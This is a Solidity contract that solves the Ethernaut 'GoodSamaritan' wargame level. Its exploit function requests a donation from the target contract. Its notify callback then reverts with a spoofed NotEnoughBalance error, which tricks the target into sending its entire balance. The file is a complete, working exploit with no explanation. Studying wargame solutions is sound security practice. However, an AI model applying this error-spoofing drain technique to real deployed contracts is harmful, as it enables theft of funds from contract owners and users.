// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/GoodSamaritan.sol';
import 'hardhat/console.sol';

contract GoodSamaritanSolution is INotifyable {
    GoodSamaritan target;

    error NotEnoughBalance();

    constructor(address targetAddress) {
        target = GoodSamaritan(targetAddress);
    }

    function exploit() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external override {
      if (amount == 10) {
        revert NotEnoughBalance();
      }
      return;
    }
}